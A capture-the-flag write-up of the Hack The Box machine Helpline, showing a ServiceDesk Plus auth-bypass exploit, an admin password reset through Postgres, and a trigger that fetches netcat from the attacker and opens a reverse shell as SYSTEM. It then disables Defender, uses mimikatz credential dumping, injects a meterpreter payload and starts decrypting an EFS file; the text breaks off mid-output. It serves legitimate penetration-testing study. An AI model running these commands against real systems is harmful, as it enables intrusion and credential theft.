---
title: HTB: Helpline Kali
url: https://0xdf.gitlab.io/2019/08/17/htb-helpline-kali.html
date: 2019-08-17T13:45:00+00:00
tags: ctf, hackthebox, htb-helpline, cve-2019-10008, postgresql, manageengine, servicedesk, nc, efs, mimikatz, defender, cipher, openssl, certutil, vnc, tightvnc
---

![kali](/icons/kali.png)

There’s a completely alternative path to Helpline, that involves getting a shell as SYSTEM from ServerDesk Plus. However, because the flag files are encrypted, there’s still some work to do. This is why the root blood came before the user blood. I’ll pick up here, most importantly having found the mobile client vulnerability in SDP. I’ll show an alternative path to SYSTEM shell via the Postgres database as well.

## Shell as SYSTEM

### SDP Privesc

#### CVE-2019-10008 /mc

There’s another exploit that was developed by a team working on Helpline ([the POC video is clearly against Helpline](https://www.youtube.com/watch?v=fCea6yRkkSQ)). I downloaded the script from [exploit-db](https://www.exploit-db.com/exploits/46659), and I changed the host from `localhost` to `10.10.10.132`. I also had to add `# -*- coding: utf-8 -*-` as the second line to handle the characters in the authors names.

On running, it dumps out cookies for an admin login:

```

root@kali# ./cve-2019-10008.py 
Url: http://10.10.10.132:8080
User with low priv: guest:guest
User to bypass authentication to: administrator
Getting a session id
Sessid:
4025CC77637C63FD630A40F6B4D42BB8
Logging in with low privilege user
Captured authenticated cookies.
866B2C35D9A39153389CE681833ABA7F
ABD8818F7535A732B8A19499946ACA40
Captured secondary sessid.
C94E30AA19979684DCB899007E9B5784
Doing the magic step 1.
Doing the magic step 2.
Captured target session.Set following cookies on your browser.
JSESSIONID=840739EDD84B3E75433CEA889B900895
JSESSIONIDSSO=DA1879D8E723600021213EAB6D58AB57
febbc30d=650c937040104f4ba9eb09e19111d80c
mesdp07bc6414b1=e7d01660072e5ff70c8e35686ea77b515a2d2ea0
_rem=true

```

I’ll take the five lines at the bottom and set each of those as cookies using the cookie plugin in my browser. When I refresh on the root url, I’m logged in as admin:

![1565642366204](https://0xdfimages.gitlab.io/img/1565642366204.png)

Looking at the script, it’s basically taking advatnage of `/mc`. In SDP, visiting `/mc` takes the user to the [mobile client login](https://help.servicedeskplus.com/mobile-client/mobile-client.html). It is a different app, but with some shared architecture. This path presents a different login page:

![1555103808768](https://0xdfimages.gitlab.io/img/1555103808768.png)

If I try to log in with the default administrator creds on the main page or the mobile page, it fails. However, if I log in as guest, then switch to `/mc`, then logout, then give administrator / anything, I’ll be logged in as admin, even when I switch back to the non-mobile site:

![](https://0xdfimages.gitlab.io/img/helpline-mc-bypass.gif)

#### Change administrator Password

An alternative to the two exploits above is to use my shell as alice and postgres access to change the administrator password for SDP.

The database here is a mess. To get a list of usernames and password hashes, I’ll do a join on the `aaapassword` and `aaalogin` tables:

```

PS helpline\alice@HELPLINE bin> ./psql.exe -h 127.0.0.1 -p 65432 -U postgres -w -d servicedesk -c "select aaapassword.password_id, aaalogin.name from aaalogin, aaapassword where aaalogin.login_id = aaapassword.password_id "
 password_id |     name      
-------------+---------------
           1 | guest
           2 | administrator
         302 | luis_21465
         303 | zachary_33258
         601 | stephen
         602 | fiona
         603 | mary
         604 | anne
(8 rows)

```

All I need to do is overwrite the password entries for id 2. The `aaapassword` table currently shows:

```

PS helpline\alice@HELPLINE bin> ./psql.exe -h 127.0.0.1 -p 65432 -U postgres -w -d servicedesk -c "select * from aaapassword;"
 password_id |                           password                           | algorithm |             salt              | passwdprofile_id | passwdrule_id |  createdtime  | factor 
-------------+--------------------------------------------------------------+-----------+-------------------------------+------------------+---------------+---------------+--------
           1 | $2a$12$6VGARvoc/dRcRxOckr6WmucFnKFfxdbEMcJvQdJaS5beNK0ci0laG | bcrypt    | $2a$12$6VGARvoc/dRcRxOckr6Wmu |                2 |             1 | 1545350288006 |     12
         302 | $2a$12$2WVZ7E/MbRgTqdkWCOrJP.qWCHcsa37pnlK.0OyHKfd4lyDweMtki | bcrypt    | $2a$12$2WVZ7E/MbRgTqdkWCOrJP. |                2 |             1 | 1545428506907 |       
         303 | $2a$12$Em8etmNxTinGuub6rFdSwubakrWy9BEskUgq4uelRqAfAXIUpZrmm | bcrypt    | $2a$12$Em8etmNxTinGuub6rFdSwu |                2 |             1 | 1545428808687 |       
           2 | $2a$12$hmG6bvLokc9jNMYqoCpw2Op5ji7CWeBssq1xeCmU.ln/yh0OBPuDa | bcrypt    | $2a$12$hmG6bvLokc9jNMYqoCpw2O |                2 |             1 | 1545428960671 |     12
         601 | $2a$12$6sw6V2qSWANP.QxLarjHKOn3tntRUthhCrwt7NWleMIcIN24Clyyu | bcrypt    | $2a$12$6sw6V2qSWANP.QxLarjHKO |                2 |             1 | 1545514864248 |       
         602 | $2a$12$X2lV6Bm7MQomIunT5C651.PiqAq6IyATiYssprUbNgX3vJkxNCCDa | bcrypt    | $2a$12$X2lV6Bm7MQomIunT5C651. |                2 |             1 | 1545515091170 |       
         603 | $2a$12$gFZpYK8alTDXHPaFlK51XeBCxnvqSShZ5IO/T5GGliBGfAOxwHtHu | bcrypt    | $2a$12$gFZpYK8alTDXHPaFlK51Xe |                2 |             1 | 1545516114589 |       
         604 | $2a$12$4.iNcgnAd8Kyy7q/mgkTFuI14KDBEpMhY/RyzCE4TEMsvd.B9jHuy | bcrypt    | $2a$12$4.iNcgnAd8Kyy7q/mgkTFu |                2 |             1 | 1545517215465 |       
(8 rows)

```

I could go setting my own password, but it seems easier just to copy one I already know, like guest. My first attempt failed:

```

PS helpline\alice@HELPLINE bin> ./psql.exe -h 127.0.0.1 -p 65432 -U postgres -w -d servicedesk -c "update aaapassword set password='$2a$12$6VGARvoc/dRcRxOckr6WmucFnKFfxdbEMcJvQdJaS5beNK0ci0laG', salt='$2a$12$6VGARvoc/dRcRxOckr6Wmu' where password_id = 2;"
UPDATE 8
PS helpline\alice@HELPLINE bin> ./psql.exe -h 127.0.0.1 -p 65432 -U postgres -w -d servicedesk -c "select * from aaapassword where password_id = 2;"
 password_id |                   password                    | algorithm |      salt      | passwdprofile_id | passwdrule_id |  createdtime  | factor 
-------------+-----------------------------------------------+-----------+----------------+------------------+---------------+---------------+--------
           2 | /dRcRxOckr6WmucFnKFfxdbEMcJvQdJaS5beNK0ci0laG | bcrypt    | /dRcRxOckr6Wmu |                2 |             1 | 1545428960671 |     12
(1 row)

```

`$` has meaning in postgres, and therefore I’ve got to figure out how to escape it. This was trickier than I expected (thanks to jkr and snowscan for tips here). One way to do it is use a unicode string, replacing `'$2a$12$6VGARvoc/dRcRxOckr6Wmu'` with `U&'\00242a\002412\00246VGARvoc/dRcRxOckr6Wmu'`. Another is to use backtick to escape, so `'`$2a`$12`$6VGARvoc/dRcRxOckr6Wmu'`.

I can rerun and it works:

```

PS helpline\alice@HELPLINE bin> ./psql.exe -h 127.0.0.1 -p 65432 -U postgres -w -d servicedesk -c "update aaapassword set password='`$2a`$12`$6VGARvoc/dRcRxOckr6WmucFnKFfxdbEMcJvQdJaS5beNK0ci0laG', salt='`$2a`$12`$6VGARvoc/dRcRxOckr6Wmu' where password_id = 2;"
UPDATE 1

PS helpline\alice@HELPLINE bin> ./psql.exe -h 127.0.0.1 -p 65432 -U postgres -w -d servicedesk -c "select password_id, password, salt from aaapassword where password_id = 1 or password_id = 2;"
 password_id |                           password                           |             salt              
-------------+--------------------------------------------------------------+-------------------------------
           1 | $2a$12$6VGARvoc/dRcRxOckr6WmucFnKFfxdbEMcJvQdJaS5beNK0ci0laG | $2a$12$6VGARvoc/dRcRxOckr6Wmu
           2 | $2a$12$6VGARvoc/dRcRxOckr6WmucFnKFfxdbEMcJvQdJaS5beNK0ci0laG | $2a$12$6VGARvoc/dRcRxOckr6Wmu
(2 rows)

```

Now I’m able to login using administrator / guest.

### Create Trigger

With admin access to SDP, I can access everything I could access before as guest. But now I can also use triggers to get a shell.

On the “Admin” page, there’s a link to “Custom Triggers”. I’ll click “Add New Action”, and fill out the form:

![1565643055423](https://0xdfimages.gitlab.io/img/1565643055423.png)

My script file to run is:

```

cmd /c powershell iwr -uri 10.10.14.14/nc64.exe -outfile c:\windows\system32\spool\drivers\color\nc.exe; c:\windows\system32\spool\drivers\color\nc.exe -e cmd.exe 10.10.14.14 443

```

Now I’ll go back to the main window, and create a new high priority ticket. Once it saves, I see the request for `nc` on my `python` web server:

```
10.10.10.132 - - [12/Aug/2019 16:52:18] "GET /nc64.exe HTTP/1.1" 200 -

```

And then I have a shell as SYSTEM:

```

root@kali# rlwrap nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.132.
Ncat: Connection from 10.10.10.132:49773.
Microsoft Windows [Version 10.0.17763.253]
(c) 2018 Microsoft Corporation. All rights reserved.

E:\>whoami
whoami
nt authority\system

```

## Get administrator Password

### Enumeration

As system, it may seem like this box is over, but it’s not. When I go to get `root.txt`, I can’t access it:

```

c:\Users\Administrator\Desktop>type root.txt
Access is denied.

```

I can use `cipher` to see more details about why:

```

c:\Users\Administrator\Desktop>cipher /c root.txt
cipher /c root.txt

 Listing c:\Users\Administrator\Desktop\
 New files added to this directory will not be encrypted.

E root.txt
  Compatibility Level:
    Windows XP/Server 2003

  Users who can decrypt:
    HELPLINE\Administrator [Administrator(Administrator@HELPLINE)]
    Certificate thumbprint: FB15 4575 993A 250F E826 DBAC 79EF 26C2 11CB 77B3 

  No recovery certificate found.

  Key information cannot be retrieved.

The specified file could not be decrypted.

```

The file is encrypted with EFS, and since SYSTEM doesn’t know the password for administrator, it can’t access the file. It actually turns out that all of the critical files on Helpline are encrypted with EFS.

### Upload Mimikatz

I’ll need `mimikatz` to get the necessary bits to decrypt the file. I’ll download the [latest release](https://github.com/gentilkiwi/mimikatz/releases) and get the x64 exe out of the zip.

Now I’ll bring it to Helpline:

```

c:\Windows\System32\spool\drivers\color>powershell iwr -uri 10.10.14.14/mimikatz.exe -outfile m.exe

c:\Windows\System32\spool\drivers\color>dir m.exe
 Volume in drive C has no label.
 Volume Serial Number is D258-5C3B

 Directory of c:\Windows\System32\spool\drivers\color

08/12/2019  09:06 PM         1,011,864 m.exe
               1 File(s)      1,011,864 bytes
               0 Dir(s)   5,844,955,136 bytes free

```

But when I try to run it, it’s gone:

```

c:\Windows\System32\spool\drivers\color>.\m.exe
The system cannot execute the specified program.

```

Defender is quarantining it. Since I’m SYSTEM, I’ll just [disable Defender](https://superuser.com/questions/1046297/how-do-i-turn-off-windows-defender-from-the-command-line):

```

c:\>powershell Set-MpPreference -DisableRealtimeMonitoring $true

```

Now it can run:

```

c:\Windows\System32\spool\drivers\color>powershell iwr -uri 10.10.14.14/mimikatz.exe -outfile m.exe

c:\Windows\System32\spool\drivers\color>.\m.exe
.\m.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 Jul 20 2019 22:57:37
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # 

```

### Fix Issue With Version

The first thing I wanted to do was dump out passwords. If I can find the admin password, I could just connect with that. I started to run `sekurlsa::logonpasswords`, but it failed:

```

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Key import  

```

Some googling shows this is a [known and recent issue](https://github.com/gentilkiwi/mimikatz/issues/214). I grabbed one version older from the releases page, uploaded it as `m2.exe`, and it works:

```

mimikatz # sekurlsa::logonpasswords
...[snip]...
Authentication Id : 0 ; 212681 (00000000:00033ec9)
Session           : Interactive from 1
User Name         : leo
Domain            : HELPLINE
Logon Server      : HELPLINE
Logon Time        : 8/12/2019 6:58:42 PM
SID               : S-1-5-21-3107372852-1132949149-763516304-1009
        msv :
         [00000003] Primary
         * Username : leo
         * Domain   : HELPLINE
         * NTLM     : 60b05a66232e2eb067b973c889b615dd
         * SHA1     : 68c6608505d867762620a64dfd354685da822bf2
        tspkg :
        wdigest :
         * Username : leo
         * Domain   : HELPLINE
         * Password : (null)
        kerberos :
         * Username : leo
         * Domain   : HELPLINE
         * Password : (null)
        ssp :
        credman :
...[snip]...

```

If I’m lucky enough to be doing this box at the same time as someone else who has taken the intended path, there’s likely administrator credentials also in memory, and I can proceed to decrypt `root.txt`. In that case, I’d see the following in the results from the previous command:

```

Authentication Id : 0 ; 3468015 (00000000:0034eaef)
Session           : NetworkCleartext from 0
User Name         : Administrator
Domain            : HELPLINE
Logon Server      : HELPLINE
Logon Time        : 8/17/2019 3:31:21 PM
SID               : S-1-5-21-3107372852-1132949149-763516304-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : HELPLINE
         * NTLM     : d5312b245d641b3fae0d07493a022622
         * SHA1     : 6148ba9dcbb1567b1c83606747dc7cfed0243dde
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : HELPLINE
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : HELPLINE
         * Password : (null)
        ssp :
        credman :

```

But on a fresh box, there’s only leo’s sha1 here. I could dump hashes from the registry using `lsadump::sam`, but those would only be NTLM hashes, and [won’t work on a local account](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files#decrypting-the-masterkey).

### More Enumeration

Some basic enumeration of the various user directories does reveal `admin-pass.xml` on leo’s desktop.

```

C:\Users\leo\Desktop>dir /b
admin-pass.xml

```

I still can’t access it as SYSTEM:

```

C:\Users\leo\Desktop>type admin-pass.xml
type admin-pass.xml
Access is denied.

```

That’s an interesting file, and I have leo’s sha1 from `sekurlsa::logonpasswords`, which means that the user is logged in in some sense.

### Load Meterpreter

At this point, I’m going to take a shot at reading the password file without decrypting it, by injecting it a process running as leo. Since leo’s info was in the logonpasswords, there’s a chance there’s a process running as leo.

I’ll build a payload with `msfvenom`:

```

root@kali# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=4444 -f exe -o met_10.10.14.14-4444.exe                                                                
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: met_10.10.14.14-4444.exe

```

I’ll share it over smb and run it:

```

C:\>net use \\10.10.14.14\share /u:df df
The command completed successfully.
C:\>\\10.10.14.14\share\met_10.10.14.14-4444.exe

```

And I get a session in `metasploit`:

```

msf5 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.14.14:4444
[*] Sending stage (206403 bytes) to 10.10.10.132
[*] Meterpreter session 1 opened (10.10.14.14:4444 -> 10.10.10.132:49743) at 2019-08-17 10:03:06 -0400
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```

### Inject into leo

There’s a few processes running as leo, including `explorer.exe`:

```

meterpreter > ps -U leo
Filtering on user 'leo'

Process List
============

 PID   PPID  Name                     Arch  Session  User          Path
 ---   ----  ----                     ----  -------  ----          ----
 608   700   conhost.exe              x64   1        HELPLINE\leo  C:\Windows\System32\conhost.exe
 700   5280  powershell.exe           x64   1        HELPLINE\leo  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe                                                                                               
 2568  836   ctfmon.exe               x64   1        HELPLINE\leo  C:\Windows\System32\ctfmon.exe
 4700  1796  sihost.exe               x64   1        HELPLINE\leo  C:\Windows\System32\sihost.exe
 4720  596   svchost.exe              x64   1        HELPLINE\leo  C:\Windows\System32\svchost.exe
 4756  596   svchost.exe              x64   1        HELPLINE\leo  C:\Windows\System32\svchost.exe
 4812  1360  taskhostw.exe            x64   1        HELPLINE\leo  C:\Windows\System32\taskhostw.exe
 5280  5260  explorer.exe             x64   1        HELPLINE\leo  C:\Windows\explorer.exe
 5296  5280  vmtoolsd.exe             x64   1        HELPLINE\leo  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe                                                                                                       
 5524  740   ShellExperienceHost.exe  x64   1        HELPLINE\leo  C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe                                                                         
 5620  740   SearchUI.exe             x64   1        HELPLINE\leo  C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe                                                                              
 5780  740   RuntimeBroker.exe        x64   1        HELPLINE\leo  C:\Windows\System32\RuntimeBroker.exe
 5852  740   RuntimeBroker.exe        x64   1        HELPLINE\leo  C:\Windows\System32\RuntimeBroker.exe
 6076  740   RuntimeBroker.exe        x64   1        HELPLINE\leo  C:\Windows\System32\RuntimeBroker.exe

```

I’ll `migrate` into `explorer`:

```

meterpreter > migrate 5280
[*] Migrating from 4192 to 5280...
[*] Migration completed successfully.

```

Now I’ll `load powershell` and get a shell as leo:

```

meterpreter > load powershell 
Loading extension powershell...Success.
meterpreter > powershell_shell 
PS > whoami
helpline\leo

```

Now I can read `admin-pass.xml`:

```

PS > type admin-pass.xml
01000000d08c9ddf0115d1118c7a00c04fc297eb01000000f2fefa98a0d84f4b917dd8a1f5889c8100000000020000000000106600000001000020000000c2d2dd6646fb78feb6f7920ed36b0ade40efeaec6b090556fe6efb52a7e847cc000000000e8000000002000020000000c41d656142bd869ea7eeae22fc00f0f707ebd676a7f5fe04a0d0932dffac3f48300000006cbf505e52b6e132a07de261042bcdca80d0d12ce7e8e60022ff8d9bc042a437a1c49aa0c7943c58e802d1c758fc5dd340000000c4a81c4415883f937970216c5d91acbf80def08ad70a02b061ec88c9bb4ecd14301828044fefc3415f5e128cfb389cbe8968feb8785914070e8aebd6504afcaa

```

### Get Password

Now I’ll get the password from that file:

```

PS > $s = cat admin-pass.xml
PS > $ss = Convertto-securestring -string $s
PS > $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist "administrator", $ss
PS > $cred.GetNetworkCredential().password
mb@letmein@SERVER#acc

```

## Read root.txt

### Via PowerShell

The easiest way forward is to use the credential (`$cred`) I created in the last step to run commands:

```

PS > Invoke-Command -ScriptBlock { whoami } -Credential $cred -Computer localhost 
helpline\administrator

```

I can read the flag:

```

PS > Invoke-Command -ScriptBlock { type C:\users\administrator\desktop\root.txt } -Credential $cred -Computer localhost
ERROR: Access to the path 'C:\Users\Administrator\desktop\root.txt' is denied.
ERROR:     + CategoryInfo          : PermissionDenied: (C:\Users\Administrator\desktop\root.txt:String) [Get-Content], Unauth
ERROR:    orizedAccessException
ERROR:     + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
ERROR:     + PSComputerName        : localhost
ERROR: 

```

Not around the EFS… but if I use `-auth CredSSP` just like over WinRM:

```

PS > Invoke-Command -ScriptBlock { type C:\users\administrator\desktop\root.txt } -Credential $cred -Computer localhost -auth credssp
d814211fc0538e50a008afd817f75a2c

```

### Decrypt EFS

#### Overview

The more interesting path is to decrypt the EFS file. I’m going to follow [this guide from the Mimikatz GitHub](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files).

#### Get The Certificate

I’ll start with the output of `cipher` run above. That tells me that certificate thumbprint is: `FB15 4575 993A 250F E826 DBAC 79EF 26C2 11CB 77B3`. That means according to the guide, I should find it in `C:\Users\administrator\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates`, and I do:

```

C:\Users\Administrator\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates>dir /a /b
FB154575993A250FE826DBAC79EF26C211CB77B3

```

Note that I’m using `dir /a`, as all of these files and directories are hidden, and it will look like there’s nothing there without the `/a`. I’m also using `/b` to give compressed output.

Now I can use `minikatz` to get info on the certificate:

```

mimikatz # crypto::system /file:"C:\Users\Administrator\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\FB154575993A250FE826DBAC79EF26C211CB77B3" /export
* File: 'C:\Users\Administrator\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\FB154575993A250FE826DBAC79EF26C211CB77B3'
[0019/1] SUBJECT_PUBLIC_KEY_MD5_HASH_PROP_ID
  6717f9a477e4b552766871d193244f25
[0045/1] BACKED_UP_PROP_ID
  00
[0002/1] KEY_PROV_INFO_PROP_ID
  Provider info:
        Key Container  : 3dd3e213-bce6-4acb-808c-a1b3227ecbde
        Provider       : Microsoft Enhanced Cryptographic Provider v1.0
        Provider type  : RSA_FULL (1)
        Type           : AT_KEYEXCHANGE (0x00000001)
        Flags          : 00000000
        Param (todo)   : 00000000 / 00000000

[0003/1] SHA1_HASH_PROP_ID
  fb154575993a250fe826dbac79ef26c211cb77b3
[0014/1] KEY_IDENTIFIER_PROP_ID
  b2cf7205f001b70c66aab61c241e46f1b4821eb8
[0020/1] cert_file_element
  Data: 30820314308201fca0030201020210194a705262024cab4094533eed3561f8300d06092a864886f70d01010505003018311630140603550403130d41646d696e6973747261746f723020170d3138313232333139353533345a180f32313138313132393139353533345a3018311630140603550403130d41646d696e6973747261746f7230820122300d06092a864886f70d01010105000382010f003082010a0282010100c33c505d59ea1dd47306b84f92833d5b33f9c6422a546368176de4b3dbbd29730192b43273ad98f3719d657176d7586e841bcb177d5e3275f092155c7c422180964a024d5d982982610860aec5525e58523d7633512b264de41a46ee7cd89c26a5a013f5a9fb1eed992f98c0ab5be241b1c796e74ba5924b7d074f15ee67534e089b86bc43d670832404fe63a9cdf5ccf84532ef8bf800597de0f4553785e516f91255be7cae47ba99cce2c1d2bda076074da0e66de4ec9e7bd4f67b49bcf896ba8f20554eeac4f28b0588378fd435dba1d4d5bd2667fa79a47835b9c834dbc0d65b067dd09ac49f31c5737665af8e3a66514135b3e5d482a7e66e7111b689390203010001a358305630150603551d25040e300c060a2b0601040182370a030430320603551d11042b3029a027060a2b060104018237140203a0190c1741646d696e6973747261746f724048454c504c494e450030090603551d1304023000300d06092a864886f70d01010505000382010100967ac2ac65fe0cb96583240be69e81173546a6d817951e338aa58d7c5e8f2b96c2af6c2a758800c086eb8cb55a525c4f85af2311ac6e655a7a071f719b5a776de45edc699bbd47bcb9b235595990bcf518d20635d297aa576b97932248414d2f1ac849d525379065f5f4c640cc9ebac0a2c240263c08ef4c54e9c9a6b08dd0cf4eb78e1d5e7341b1a950045c2d3233554aeff1294d300e0a5cf75eaf832b76c0fa96e7e3a4c28ddb639d366da1e0f3af91d678c22acd980890af1372f37954d503e133261a078a161d9cba85dd28b2ef0eebffb1b8ae0980c7978021b01fcf0dc5f282ab67be4540418b05a627b6b34b06bf5283b00efb3a32ae651e132eb3d3                                       
  Saved to file: FB154575993A250FE826DBAC79EF26C211CB77B3.der

```

I’ll need that certificate later. I’ll also continue knowing that the Key Container ID is `3dd3e213-bce6-4acb-808c-a1b3227ecbde`.

#### About The Private Key

Now I’ll go digging into `C:\Users\Administrator\AppData\Roaming\Microsoft\Crypto\RSA` to find the containers. There’s only one sid:

```

C:\Users\Administrator\AppData\Roaming\Microsoft\Crypto\RSA>dir /a /b
S-1-5-21-3107372852-1132949149-763516304-500

```

In that dir, there is only one potential key container file:

```

C:\Users\Administrator\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-3107372852-1132949149-763516304-500>dir /a /b
d1775a874937ca4b3cd9b8e334588333_86f90bf3-9d4c-47b0-bc79-380521b14c85

```

I’ll use `mimikatz` to get details. I want to make sure the `pUniqueName` matches the Key Container ID from above, and it does:

```

mimikatz # dpapi::capi /in:"C:\Users\Administrator\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-3107372852-1132949149-763516304-500\d1775a874937ca4b3cd9b8e334588333_86f90bf3-9d4c-47b0-bc79-380521b14c85"
**KEY (capi)**
  dwVersion          : 00000002 - 2
  dwUniqueNameLen    : 00000025 - 37
  dwSiPublicKeyLen   : 00000000 - 0
  dwSiPrivateKeyLen  : 00000000 - 0
  dwExPublicKeyLen   : 0000011c - 284
  dwExPrivateKeyLen  : 00000650 - 1616
  dwHashLen          : 00000014 - 20
  dwSiExportFlagLen  : 00000000 - 0
  dwExExportFlagLen  : 000000fc - 252
  pUniqueName        : 3dd3e213-bce6-4acb-808c-a1b3227ecbde
  pHash              : 0000000000000000000000000000000000000000
  pSiPublicKey       :
  pSiPrivateKey      :
  pSiExportFlag      :
  pExPublicKey       : 525341310801000000080000ff000000010001003989b611716ee6a782d4e5b3354151663a8eaf657673c5319fc49ad07d065bd6c0db34c8b93578a479fa6726bdd5d4a1db35d48f3788058bf2c4ea4e55208fba96f8bc497bf6d47b9eece46de6a04d0776a0bdd2c1e2cc99ba47ae7cbe5512f916e5853755f4e07d5900f88bef3245f8ccf5cda963fe04248370d643bc869b084e5367ee154f077d4b92a54be796c7b141e25babc0982f99ed1efba9f513a0a5269cd87cee461ae44d262b5133763d52585e52c5ae6008618229985d4d024a968021427c5c1592f075325e7d17cb1b846e58d77671659d71f398ad7332b492017329bddbb3e46d176863542a42c6f9335b3d83924fb80673d41dea595d503cc30000000000000000                                                                                                                                                                        
  pExPrivateKey      :
  **BLOB**
    dwVersion          : 00000001 - 1
    guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
    dwMasterKeyVersion : 00000001 - 1
    guidMasterKey      : {9e78687d-d881-4ccb-8bd8-bc0a19608687}
    dwFlags            : 00000000 - 0 ()
    dwDescriptionLen   : 0000002c - 44
    szDescription      : CryptoAPI Private Key
    algCrypt           : 00006610 - 26128 (CALG_AES_256)
    dwAlgCryptLen      : 00000100 - 256
    dwSaltLen          : 00000020 - 32
    pbSalt             : 636d94346c64834703f72ac073d477dfbf956804655e17c6f37e2865deb4d1f9
    dwHmacKeyLen       : 00000000 - 0
    pbHmackKey         :
    algHash            : 0000800e - 32782 (CALG_SHA_512)
    dwAlgHashLen       : 00000200 - 512
    dwHmac2KeyLen      : 00000020 - 32
    pbHmack2Key        : 168bc09c733e929c54210737b2a287fbbbb4addfd2fd9e9de5768ed1a03162e4
    dwDataLen          : 00000550 - 1360
    pbData             : 4ea3c71a9d7383df26037dbfe5e4cdf6fc0ba47c7cb72f319b6cd6480ced3ff383beb0987aff0f2fb7d407fc1c03356fec5abb8679b314d77442b61e60fb6a26e05bdfb45c8766f6a631ef9157acd07801d5dc11f0bb154c67667386e060ee26d23b2b8eabdc7704a4deb978b54c2ced8186a2f0f6e2dfcae00373ccebb41d0328fa8a56c10bbbdaac2d65e9aca68c96f8bda7fb813104e5c0c8c0c1098c53861a39d4e5ce9e856f07baff3373dec17e58998568493519d6d7fb09398b1370f2c90a248d85bf9a6b887f9c62efd190ccd10019fe4a99482df2fc6ca12324fc1f4c13da2ff8501ec50d8c04ba450b3e8542af7d5ad22d50d17c84ea47a181dc945ad481ba73089b453667cba5ab7edf2252bf002c36a6b68640c4feed5af84a095006445c54a546693d49fe4dd2744da7185c17777bc43c98936999011114efcc0052823ee5beafcd67ae82b6be5ed01233a7bcc61ffd13c420fc132d4be62163f4c3f33667f9eb569f0711258b6eea3f989c36f0250b7d0a8e704583546e31f8a6edfdc10fa175df1c2b8b5081cb0b5555c6d59c88bea128e574d6853c2f14bc56ecee49ac526c47b54cbf0eec70b80bde4dd9f29aa813413250c819d2a7dcfeec03abcb2e664b30e0c9b8ef1657b80d450aafe6de81dd6df8880591c6d3025f7395ba86a9b735155143e0628bdef1de7ca1a3d3dd4ffde8fb32570a92d0c87ad84706342fe3ac35d3961c780fa760e67c713a5440708cefc08f77a4d2c23e89004343f6964aa3322ce895430b1e4a33e2ab20ad5526cbd505344bc67651ff2f5b48d9dd01de8c92b7d9a56ba4cf4f1ea61276fe2daa6bc804148f38a565d2a54c20e090a03c5eb25cde18885f8153bd31a7005d18c9913387942c34ce6c9060e551dadb9be171f2a3decb46ba10fa574bededf8c5e69cea4cdfaec894f447121dff6e2fafb21ab55b92419048eb5fa39002eaa24ff88f3e08a3f23684a5d1508be1c1d3a55e73a263c0ea1a15a8c66b2b34354ab197a7f3ca14fe036959f32b27a96d54c0d978adf27ae80702c65e7eb82da6ab112fc493410242c0734d0f84641a2aa12ddf34d395eba1f26dc5cf0fde8ad7954a5444b30fc0ad1240bb198ce23a1a356fef4bb8482b839f9b0584b90b321d3cc73e37b2f6cff710c83275afdea0a9bbcd1f472bd7b6935a6ced7aea0ae0017c8d1dacc93a8d3b0206d915c4b19369529bc96104fc055ff5078fa1c5f1dd240320549bfaf8e2ec2da18c73259182a0a3964794ff93e22c6a4fae51991a0582d09b67f79331ffe9c020db6742c6b9bde98abf18c789d19246584a90b8584ac5e46c2109afbe024e4a6a273781898520c35e566c42675c7368baa892c9cabf1ec6c2c969931d1a1987a4f622d135dfac29b11623d2560147c54257de3397f3c2e479070990deb55f197359d5282b0c59aee9c32feb16b0eb405d98bf15df04de0ec93b0adc6f827de6e81626743bed95cbc816161a11c324d7118429c2e1b923293b22254a076a33ee4e68af7e1d15b66712139fd39902548ec23834be55e1c1133ffd7ed6e3b78c003cc612cf0408acf84e8e02cf983425e9830a07982163f997785fa0ad4c088b76edfaa86e6a1ab0c315b317578f70fff21a88178153c2d7663fdc5fb5267d48998f577ca94aa538a38a0acde37d52af53d629a2f55f02f46460bd4fce7a34a750798be6b32709fa673032b27aa14d068a491a060072779c6e719621ac42f3692d91fc975bce8ac32fe81e94525b05a251e906043d8f934ebcbf49a8947ab9bbb8d4a7fc653fab9543d0c22628bb9513390656cbb9f41a103103ed0485103b3f8f75154279bae4d5de5dfb023875bf8c610435ee550b155b3052447188c0530a49399c26b4e1a57078fcbaaf2d2eed0621d2e3ff56
    dwSignLen          : 00000040 - 64
    pbSign             : 772ca28a76efbef47c88f050da7814232bbb7d72d8692d02f85a9046d0b57da2cf94b455a2c9618811b07146b26242128caed8bace68bca36e0771e05564b0dd

  pExExportFlag      :
  **BLOB**
    dwVersion          : 00000001 - 1
